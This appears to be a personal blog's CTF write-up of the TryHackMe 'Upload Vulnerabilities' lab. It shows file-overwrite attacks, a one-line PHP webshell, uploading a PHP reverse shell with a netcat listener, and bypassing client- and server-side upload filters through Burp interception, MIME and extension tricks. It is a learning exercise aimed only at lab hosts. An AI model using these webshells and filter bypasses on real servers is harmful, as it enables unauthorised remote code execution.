@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Rob]">
+<meta name="description" content="Welcome to my write-up of the Upload Vulnerabilities room on TryHackMe, created by MuirlandOracle. Let&amp;rsquo;s jump in.
+Note: The Complete Beginner THM skill path is now considered depricated in favor of the Jr Penetration Tester path.
+Task 1 - Getting Started The room begins with a necessary configuration step. The hosts file of the attacking machine needs to be modified to include the following line:
+&amp;lt;machine-ip&amp;gt; overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic." />
+<meta name="keywords" content="cybersecurity, hacking, tryhackme, blog, blog, tryhackme, gobuster, burpsuite, php, node.js" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities--write-up/" />
+
+    <title>
+        robscharf@github
+    </title>
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://robscharf.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://robscharf.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://robscharf.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://robscharf.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://robscharf.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://robscharf.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://robscharf.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="THM: Upload Vulnerabilities -- Write-Up">
+<meta itemprop="description" content="Welcome to my write-up of the Upload Vulnerabilities room on TryHackMe, created by MuirlandOracle. Let&rsquo;s jump in.
+Note: The Complete Beginner THM skill path is now considered depricated in favor of the Jr Penetration Tester path.
+Task 1 - Getting Started The room begins with a necessary configuration step. The hosts file of the attacking machine needs to be modified to include the following line:
+&lt;machine-ip&gt; overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic."><meta itemprop="datePublished" content="2022-04-28T11:30:00+00:00" />
+<meta itemprop="dateModified" content="2022-04-28T11:30:00+00:00" />
+<meta itemprop="wordCount" content="5352"><meta itemprop="image" content="https://robscharf.github.io/"/>
+<meta itemprop="keywords" content="blog,tryhackme,gobuster,burpsuite,php,node.js," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://robscharf.github.io/"/>
+
+<meta name="twitter:title" content="THM: Upload Vulnerabilities -- Write-Up"/>
+<meta name="twitter:description" content="Welcome to my write-up of the Upload Vulnerabilities room on TryHackMe, created by MuirlandOracle. Let&rsquo;s jump in.
+Note: The Complete Beginner THM skill path is now considered depricated in favor of the Jr Penetration Tester path.
+Task 1 - Getting Started The room begins with a necessary configuration step. The hosts file of the attacking machine needs to be modified to include the following line:
+&lt;machine-ip&gt; overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic."/>
+
+
+
+
+    <meta property="og:title" content="THM: Upload Vulnerabilities -- Write-Up" />
+<meta property="og:description" content="Welcome to my write-up of the Upload Vulnerabilities room on TryHackMe, created by MuirlandOracle. Let&rsquo;s jump in.
+Note: The Complete Beginner THM skill path is now considered depricated in favor of the Jr Penetration Tester path.
+Task 1 - Getting Started The room begins with a necessary configuration step. The hosts file of the attacking machine needs to be modified to include the following line:
+&lt;machine-ip&gt; overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities--write-up/" /><meta property="og:image" content="https://robscharf.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-28T11:30:00+00:00" />
+<meta property="article:modified_time" content="2022-04-28T11:30:00+00:00" />
+
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-04-28 11:30:00 &#43;0000 UTC" />
+
+
+
+
+
+
+<link rel="stylesheet" href='https://robscharf.github.io/style.css'>
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://robscharf.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">(virtualtack@github)-[~] $ </span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:white;
+                   animation-duration:1.6s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://robscharf.github.io/posts/">posts</a></li><li><a href="https://robscharf.github.io/resume/">résumé</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        26 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        THM: Upload Vulnerabilities &ndash; Write-Up
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>Welcome to my write-up of the <a href="https://tryhackme.com/room/uploadvulns">Upload Vulnerabilities</a> room on <a href="https://tryhackme.com/">TryHackMe</a>, created by <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a>. Let&rsquo;s jump in.</p>
+<p><strong>Note:</strong> The <a href="https://tryhackme.com/paths">Complete Beginner</a> THM skill path is now considered <em>depricated</em> in favor of the <a href="https://tryhackme.com/path-action/jrpenetrationtester/join">Jr Penetration Tester</a> path.</p>
+<h2 id="task-1---getting-started">Task 1 - Getting Started</h2>
+<p>The room begins with a necessary configuration step. The <code>hosts</code> file of the attacking machine needs to be modified to include the following line:</p>
+<p><code>&lt;machine-ip&gt;    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm</code></p>
+<p>Note: You will require administrator-level privileges when editing the file. This can be done via <code>sudo</code> on Linux and <code>Run as Administrator</code> on Windows.</p>
+<p>The <code>hosts</code> file can be found at <code>/etc/hosts</code> on Linux and at <code>C:\Windows\System32\drivers\etc\hosts</code> on Windows.</p>
+<h2 id="task-2---introduction">Task 2 - Introduction</h2>
+<p>This task provides context for our task of exploiting vulnerable file upload systems on the web, outlining some of the opportunities for malicious actors. The text explains that the purpose of this THM room is to &ldquo;explore some of the vulnerabilities resulting from improper (or inadequate) handling of file uploads.&rdquo;</p>
+<p>This includes:</p>
+<ul>
+<li>Overwriting existing files on a server</li>
+<li>Uploading and Executing Shells on a server</li>
+<li>Bypassing Client-side filtering</li>
+<li>Bypassing various kinds of Server-side filtering</li>
+<li>Fooling content type validation checks</li>
+</ul>
+<h2 id="task-3---general-methodology">Task 3 - General Methodology</h2>
+<p>As the title indicates, additional information is provided through this task on how upload vulnerabilities are exploited.</p>
+<blockquote>
+<p>As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we&rsquo;re able to do with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied.</p>
+</blockquote>
+<p>The text mentions several relevant tools for this endeavor, including <a href="https://github.com/OJ/gobuster">Gobuster</a>, <a href="">BurpSuite</a>, and <a href="https://www.wappalyzer.com/apps">WappAnalyzer</a>.</p>
+<h2 id="task-4---overwriting-existing-files">Task 4 - Overwriting Existing Files</h2>
+<p>With properly configured permissions, servers that accept file uploads will ensure that newly uploaded files will not overwrite existing ones and that standard web visitors will not be able to maliciously alter web pages or server functions.</p>
+<p>An example is then presented, involving a webpage with file upload capabilities. By inspecting the page&rsquo;s source code, we can see that: a) uploaded images are likely stored in the servers <code>/images</code> directory, and that there is an existing file (displayed on the home page) called <code>spaniel.jpg</code>. A new <code>spaniel.jpg</code> image is then uploaded, which overwrites the original.</p>
+<h4 id="question-41">Question 4.1</h4>
+<h5 id="what-is-the-name-of-the-image-file-which-can-be-overwritten">What is the name of the image file which can be overwritten?</h5>
+<p>After navigating to <code>overwrite.uploadvulns.thm</code>, we can view the page&rsquo;s source code to learn about the upload destination and image displayed on the page, just like in the example provided.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-task4.png" alt="uv-task4"></p>
+<h4 id="question-42">Question 4.2</h4>
+<h5 id="overwrite-the-image-what-is-the-flag-you-receive">Overwrite the image. What is the flag you receive?</h5>
+<p><img src="https://robscharf.github.io/images/uv/uv-task4-2.png" alt="uv-task4-2"></p>
+<h2 id="task-5---remote-code-execution">Task 5 - Remote Code Execution</h2>
+<p>There are two primary methods for achieving Remote Code Execution (RCE)</p>
+<ol>
+<li>Webshells</li>
+<li>Reverse Shells</li>
+</ol>
+<h3 id="methodology">Methodology</h3>
+<h4 id="webshells">Webshells</h4>
+<p>For a given webpage with upload form, run something like a <a href="">GoBuster</a> scan on <code>dir</code> mode, using a relevant wordlist with <code>-w</code>.</p>
+<pre tabindex="0"><code>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
+</code></pre><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
+<pre tabindex="0"><code>&lt;?php 
+	echo system($_GET[&#34;cmd&#34;]);
+?&gt;
+</code></pre><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
+<h4 id="remote-shell">Remote Shell</h4>
+<p>After editing and uploading the necessary reverse shell script, such as <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentest Monkey&rsquo;s 2007 PHP tool</a>, the attacking machine can invoke a <code>netcat</code> listener via the venerable</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+</code></pre><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
+<h4 id="question-51">Question 5.1</h4>
+<h5 id="run-a-gobuster-scan-on-the-website-using-the-syntax-from-the-screenshot-above-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?</h5>
+<p>Running:</p>
+<pre tabindex="0"><code>gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+</code></pre><p>creates the following output:</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-gobuster.png" alt="UV - Gobuster"></p>
+<h4 id="question-52">Question 5.2</h4>
+<h5 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww-directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the /var/www/ directory of the server?</h5>
+<p>After editing and uploading the aforementioned Pentest Monkey PHP script, we instantiate the <code>netcat</code> listener</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-ncl.png" alt="ncl"></p>
+<p>When we navigate to our uploaded ptm script at <code>http://shell.uploadvulns.thm/resources/ptm-shell.php</code>, we are greeted with</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-504.png" alt="uv-504"></p>
+<p>However, our <code>netcat</code> listener has picked up the reverse shell!</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-rce.png" alt="uv-rce"></p>
+<p>Then we simply navigate to the <code>/var/www</code> directory to find the flag.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-flag.png" alt="uv-flag"></p>
+<h2 id="task-6---filtering">Task 6 - Filtering</h2>
+<p>This task introduces the notion that, thus far, we have not encountered any form of security measures that have been implemented by developers to mitigate the effects of would-be file upload vulnerabilities. In this task, we begin to consider the relevant security mechanisms and how to circumvent them.</p>
+<p>Our first focus will be on the concept of <em>filtering</em>, that is, attempts to prevent unintended files from being successfully uploaded to the server. This is accomplished through two primary approaches:</p>
+<h3 id="client-side-vs-server-side">Client-side vs. Server-side</h3>
+<h4 id="client-side-filtering">Client-side filtering</h4>
+<blockquote>
+<p>When we talk about a script being &ldquo;Client-Side&rdquo;, in the context of web applications, we mean that it&rsquo;s running in the user&rsquo;s browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on our computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.</p>
+</blockquote>
+<h4 id="server-side-filtering">Server-side filtering</h4>
+<blockquote>
+<p>Conversely, as you may have guessed, a server-side script will be run on the server. Traditionally PHP was the predominant server-side language (with Microsoft&rsquo;s ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don&rsquo;t have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.</p>
+</blockquote>
+<p>Next, we look at some common methods for filtering.</p>
+<h3 id="filtering-mechanisms">Filtering Mechanisms</h3>
+<h4 id="extension-validation">Extension Validation</h4>
+<p>While file extensions theoretically identify the contents of a file, in reality they are easy to change, thus making them highly unreliable. While Windows still uses them to identify file types, Unix systems usually rely on other methods. Extension filters conventionally operate by blacklisting unwanted extensions or whitelisting allowed extensions.</p>
+<h4 id="file-type-filtering">File-Type Filtering</h4>
+<p>FTF is a bit more intensive than simple extension validation, and can be accomplished with the following two approaches, among others.</p>
+<h5 id="mime-validation">MIME Validation</h5>
+<p><a href="https://en.wikipedia.org/wiki/MIME">Multipurpose Internet Mail Extension</a> &ldquo;is an Internet standard that extends the format of email messages to support text in character sets other than ASCII, as well as attachments of audio, video, images, and application programs.&rdquo;</p>
+<p>Notably, for our purposes:</p>
+<blockquote>
+<p>Although the MIME formalism was designed mainly for SMTP, its content types are also important in other communication protocols. In the HyperText Transfer Protocol (HTTP) for the World Wide Web, servers insert a MIME header field at the beginning of any Web transmission. Clients use the content type or media type header</p>
+</blockquote>
+<p>The room text explains that:</p>
+<blockquote>
+<p>The MIME type for a file upload is attached in the header of the request. MIME types follow the format <type>/<subtype>. In the request above, you can see that the image &ldquo;spaniel.jpg&rdquo; was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was &ldquo;image/jpeg&rdquo;. The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.</p>
+</blockquote>
+<p>and gives us this example:</p>
+<p><img src="https://robscharf.github.io/images/uv/mime-example.png" alt="mime-example"></p>
+<h5 id="magic-number-validation">Magic Number Validation</h5>
+<p>While not being impossible to forge, magic numbers are a more accurate way to determine the contents of a file than MIME Validation.  A file&rsquo;s &ldquo;magic number&rdquo; appears as a string of bytes at the beginning of a file. The course gives us an example:</p>
+<p>A <code>PNG</code> file would have a first line of <code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
+<p><img src="https://robscharf.github.io/images/uv/magic-number-example.png" alt="magic-number-example"></p>
+<h4 id="file-length-filtering">File Length Filtering</h4>
+<p>Filters can be configured to limit the size of files uploaded. This avoid vulnerabilities related to large, complex exploits, as well as preserving system resources that would otherwise be devoted to handling exceptionally large files.</p>
+<p>In most cases, this will not affect the ability of attackers to upload a webshell/remote shell-sized file, however exceptionally restrictive filters may require a change in approach.</p>
+<h4 id="file-name-filtering">File Name Filtering</h4>
+<p>Filters related to uploaded file names not only protect against overwritten files, like the rudimentary attack highlighted in Task 4 - Overwriting Existing Files, but also facilitate the sanitization of file names, which, in turn, mitigates the use of &ldquo;bad&rdquo; characters (e.g., null bytes, &ldquo;control&rdquo; characters like <code>;</code> , and/or the use of UNICODE).</p>
+<p>The room notes that:</p>
+<blockquote>
+<p>&hellip;on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.</p>
+</blockquote>
+<h4 id="file-content-filtering">File Content Filtering</h4>
+<p>Some servers may have more complex scanning and verification systems. These are outside of the scope of this room.</p>
+<h4 id="before-moving-on">Before moving on</h4>
+<p>The room notes that:</p>
+<blockquote>
+<p>&hellip;none of these filters are perfect by themselves &ndash; they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both&hellip;</p>
+</blockquote>
+<blockquote>
+<p>Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until PHP major version five, it was possible to bypass an extension filter by appending a null byte, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the exif data of an otherwise valid image file, then force the server to execute it.</p>
+</blockquote>
+<h4 id="question-61">Question 6.1</h4>
+<h5 id="what-is-the-traditionally-predominant-server-side-scripting-language">What is the traditionally predominant server-side scripting language?</h5>
+<p><strong>Answer:</strong> Earlier in the text, we&rsquo;re told that this is <code>php</code>.</p>
+<h4 id="question-62">Question 6.2</h4>
+<h5 id="when-validating-by-file-extension-what-would-you-call-a-list-of-accepted-extensions-whereby-the-server-rejects-any-extension-not-in-the-list">When validating by file extension, what would you call a list of accepted extensions (whereby the server rejects any extension not in the list)?</h5>
+<p><strong>Answer:</strong> Also in the preceding text, we&rsquo;re told that this is is called a <code>whitelist</code>.</p>
+<h4 id="question-63">Question 6.3</h4>
+<h5 id="what-mime-type-would-you-expect-to-see-when-uploading-a-csv-file">What MIME type would you expect to see when uploading a CSV file?</h5>
+<p><strong>Answer:</strong> Search engine results reveal that this is <code>text/csv</code>.</p>
+<h2 id="task-7---bypassing-client-side-filtering">Task 7 - Bypassing Client-side Filtering</h2>
+<p>We now delve into more depth related to Client-side vs Server-side binary that we encountered earlier, beginning with the client-side.</p>
+<p><strong>Note:</strong> Client-side filtering is generally weaker than server-side filtering</p>
+<h3 id="evading-client-side-filters">Evading client-side filters</h3>
+<p>There are four primary ways to evade client-side filters:</p>
+<ol>
+<li><strong>DisablingJavaScript in the browser</strong>
+<ul>
+<li>This is viable and effective, as long as the web page&rsquo;s basic functionality is not contingent on JavaScript.</li>
+</ul>
+</li>
+<li><strong>Intercepting and modifying incoming pages</strong>
+<ul>
+<li>Applications like BurpSuite can be used to capture incoming page data, allowing us to remove the JavaScript content before it can run.
+<ul>
+<li>This method takes place <em>before</em> a webpage is loaded in the browser.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Intercepting and modifying file uploads</strong>
+<ul>
+<li>This technique allows us to capture and alter uploaded data after it has been accepted by the server&rsquo;s filtering system.
+<ul>
+<li>This method takes place <em>after</em> a webpage is loaded in the browser.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Sending file(s) directly to the upload point</strong>
+<ul>
+<li>Using tools like <code>curl</code>, we can upload code directly to upload destinations.</li>
+<li>An application such as BurpSuite can be used to capture upload process, in order to analyze and duplicate the necessary parameters.</li>
+</ul>
+</li>
+</ol>
+<p>We will now take a look at an approach to executing items 2 and 3 on this list.</p>
+<h3 id="methodology-intercepting-and-modifying-incoming-pages">Methodology: Intercepting and modifying incoming pages</h3>
+<p>Arriving at <code>http://demo.uploadvulns.thm</code> - a basic file upload page, we inspect the HTML source and find a JavaScript function that checks uploaded files to verify that they are of the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME</a> type <code>image/jpeg</code>. This means that <code>image/jpeg</code> files are <em>whitelisted</em>.</p>
+<p>After verifying that the server&rsquo;s upload function works in this manner, we intercept an upload attempt, using BurpSuite.</p>
+<p>With <code>interception</code> enabled, we find our header request and right-click, selecting <code>Do Intercept</code> then <code>Response to this request</code>.  When we click <code>forward</code>, we will receive the server&rsquo;s response, allowing us to modify the data by disabling or removing the JavaScript filter function. When we have nullified the filter, we can press <code>forward</code> again to pass the data into our browser. The resulting web page should allow us to upload any type of file.</p>
+<p><strong>(Useful) Note:</strong> Burpsuite will not, by default, intercept any external JavaScript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you&rsquo;ll need to go to the &ldquo;Options&rdquo; tab at the top of the BurpSuite window, then under the &ldquo;Intercept Client Requests&rdquo; section, edit the condition of the first line to remove <code>^js$|</code>.</p>
+<p><img src="https://robscharf.github.io/images/uv/burp-js-interception-alt.png" alt="burp-js-interception-alt"></p>
+<h3 id="methodology-intercepting-and-modifying-file-uploads">Methodology: Intercepting and modifying file uploads</h3>
+<p>Next, we will perform a similar attack, instead intercepting the uploaded file <em>after</em> it has passed through the server&rsquo;s filtering function.</p>
+<p>We will accomplish this by redeploying the Pentest Monkey remote shell script that we used to complete Task 5. Here, we will simply rename the file from <code>ptm-shell.php</code> to <code>shell.jpeg</code>, allowing it to pass through the server&rsquo;s filter. This is due to the fact that the file&rsquo;s inauthentic MIME type of <code>image/jpeg</code> is confirmed by its <code>.jpg</code> extension.</p>
+<p>Before initiating the upload, we need to do two things.</p>
+<p>First, we set up a <code>netcat</code> listener on our attack machine, just like in task 5, ensuring that the port value corresponds with the variable in the <code>shell.jpeg</code> script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp &lt;port&gt;
+</span></span></code></pre></div><p>Second, we enable <code>interception</code> in BurpSuite.</p>
+<p>After initiating the upload, Burp will intercept the <code>POST</code> request. In the request details, we can see that the <code>filename</code> is set to <code>shell.jpeg</code>  and the <code>Content-type</code> value is set to <code>image/jpeg</code>, reflecting the whitelist constraint imposed by the server&rsquo;s JavaScript filter function.</p>
+<p>After modifying these two fields to <code>filename=&quot;shell.php&quot;</code> and <code>Content-type: text/x-php</code>, we can forward the request to the server. Once the upload has completed, we can navigate to <code>http://demo.uploadvulns.thm/uploads/shell.php</code>, which will execute our reverse shell script, spawning a shell in our <code>netcat</code> listener.</p>
+<h4 id="question-71">Question 7.1</h4>
+<h5 id="what-is-the-flag-in-varwww">What is the flag in /var/www/?</h5>
+<p>We begin by navigating to <code>java.uploadvulns.thm</code> to find a basic upload form web page.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java.png" alt="uv-java"></p>
+<p>By viewing the <code>page source</code>, we see that a JavaScript file <code>http://java.uploadvulns.thm/assets/js/client-side-filter.js</code> runs as the last script in the HTML document&rsquo;s <code>&lt;head&gt;</code> section.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-head.png" alt="uv-java-head"></p>
+<p>Which looks like:</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-filter.png" alt="uv-java-filter"></p>
+<p>From this, we understand that the <code>image/png</code> MIME type is effectively whitelisted.</p>
+<p>Next, we invoke <code>gobuster</code> in <code>directory</code> mode to enumerate server directories. This gives us a couple of results.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-gb.png" alt="uv-java-gb"></p>
+<p>Applying Occam&rsquo;s Razor, as the whitelisted MIME type is an image, it is likely that uploaded files are stored in the <code>/images</code> directory. We can test this theory by uploading some clip-art in <code>PNG</code> format and navigating to the resulting storage location in our browser.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-coffee.png" alt="uv-java-coffee"></p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-coffee-uploaded.png" alt="uv-java-coffee-uploaded"></p>
+<p>With the web page&rsquo;s file upload ability and destination established, we can &ldquo;hide&rdquo; our <code>ptm-shell.php</code> as <code>ptm-shell.png</code> and upload the file.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-coffee-ptm-png.png" alt="uv-java-shell-rename"></p>
+<p>We will then initiate our <code>netcat</code> listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>and we enable <code>interception</code> in Burp Suite. Then, we initiate the upload and edit the intercepted <code>POST</code> submission from our browser.</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-burpint.png" alt="uv-java-burpint"></p>
+<p>After we have used <code>Forward</code> to send it along to the server, we can navigate to <code>http://java.uploadvulns.thm/images/ptm-shell.php</code> to execute our shell script. Our browser will be greeted with:</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-504.png" alt="uv-java-504"></p>
+<p>But our <code>netcat</code> listener will have spawned our reverse shell:</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-rce.png" alt="uv-java-rce"></p>
+<p>From here we can navigate to the flag!</p>
+<p><img src="https://robscharf.github.io/images/uv/uv-java-flag.png" alt="uv-java-flag"></p>
+<h2 id="task-8---bypassing-server-side-filtering-file-extensions">Task 8 - Bypassing Server-side Filtering: File Extensions</h2>
+<p>The previous task was fairly simple, as local filters can be viewed and analyzed, even if this requires a bit of deobfuscatoin or processing. With Server-side filtering, filters can not be viewed directly, thus requiring more experimentation and testing to determine which payloads are permitted by the server.</p>
+<h3 id="methodology-1">Methodology</h3>
+<h4 id="evading-server-side-filters">Evading server-side filters</h4>
+<p>The first example for this task begins by introducing a website that uses the following PHP script to disallow or blacklist files that have <code>.php</code> or <code>.phtml</code> extensions with the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Get the extension
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($_FILES[<span style="color:#e6db74">&#34;fileToUpload&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])[<span style="color:#e6db74">&#34;extension&#34;</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Check the extension against the blacklist -- .php and .phtml
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">switch</span>($extension){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;php&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;phtml&#34;</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#66d9ef">NULL</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $uploadFail <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            $uploadFail <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>This script checks the extension of the <code>fileToUpload</code> against the simple blacklist of <code>php</code> and <code>phtml</code>.</p>
+<p>As we will need to upload a file with another extension, we must consider alternate approaches. The <a href="https://en.wikipedia.org/wiki/PHP">Wikipedia page for PHP</a>  introduce common extensions to look into, which are complemented by an array of uncommon, but executable, <code>PHP</code> formats, such as:</p>
+<ul>
+<li>.php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar</li>
+</ul>
+<p>The text notes that the server in the example is configured not to recognize most of these as <code>PHP</code> files (though, Apache2 servers are actually configured by default to do so). However, <code>.phar</code> files are found to bypass the filter <strong>and</strong> execute as <code>PHP</code> on the server.</p>
+<p>The next example uses the same premise, but this time involving a server with an unknown filtering mechanism. This is known as doing it &ldquo;<em>black-box</em>.&rdquo;<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.</p>
